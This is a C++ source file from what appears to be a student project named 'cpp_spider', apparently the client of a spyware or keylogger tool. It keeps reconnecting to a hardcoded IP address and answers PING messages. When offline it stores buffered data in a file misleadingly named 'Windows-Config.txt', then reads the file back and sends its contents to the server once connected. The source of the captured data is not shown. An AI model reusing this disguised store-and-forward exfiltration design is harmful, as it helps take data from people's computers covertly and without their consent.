/*
** ClientProtocol.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/Protocol/ClientProtocol.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 11:45:58 2017 Maxime PILLON
** Last update Thu Oct 05 11:45:58 2017 Maxime PILLON
*/

#include <regex>
#include <fstream>
#include <iostream>
#include <Thread/IThread.hpp>
#include <Thread/BoostThread.hpp>
#include "Protocol/Buffer.hpp"
#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"

std::atomic_bool isConnected(false);

spider::ClientProtocol::ClientProtocol()
{}

spider::ClientProtocol::~ClientProtocol() {}

void spider::ClientProtocol::checkPing()
{
  Buffer &buf = Buffer::BufferInstance();
  BufferSender &sender = BufferSender::BufferSenderInstance();

  std::string str = buf.getBuf();

  if (str.empty())
    return ;
  t_unserialized tmp = spider::Serializer::getSerializer().unserialize(spider::Serializer::getSerializer().get_ptree_from_string(str));
  if (!tmp.command)
    return ;
  isConnected.store(true);
  if (tmp.command->type == std::string("PING"))
  {
    t_command cmd;
    std::time_t			ts;
    std::stringstream		ss;

    cmd.type = "PONG";
    ts = std::time(nullptr);
    ss << ts;
    cmd.data = ss.str();
    sender.push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(cmd)));
  }
}

void spider::runServerNetwork() {}

void spider::runNetwork()
{
  spider::ClientNetwork	_net("10.26.112.233", PORT);

  for (;;)
  {
    if (!isConnected.load())
    {
      _net.connect();
      continue ;
    }
    if (isConnected.load())
      _net.send();
    if (isConnected.load())
      _net.read();
  }
}

void spider::ClientProtocol::run()
{
  BufferSender &buf = BufferSender::BufferSenderInstance();
  std::fstream file;

  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::ate);
  if (!file.is_open())
    file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
  for (;;)
  {
    Sleep(500);
    this->checkPing();
    if (!isConnected.load())
    {
      std::string str;
      str = buf.getBuf();
      if (!str.empty())
	file << str;
      continue;
    }
    std::string tmp;
    getline(file, tmp);
    buf.push(tmp);
  }
}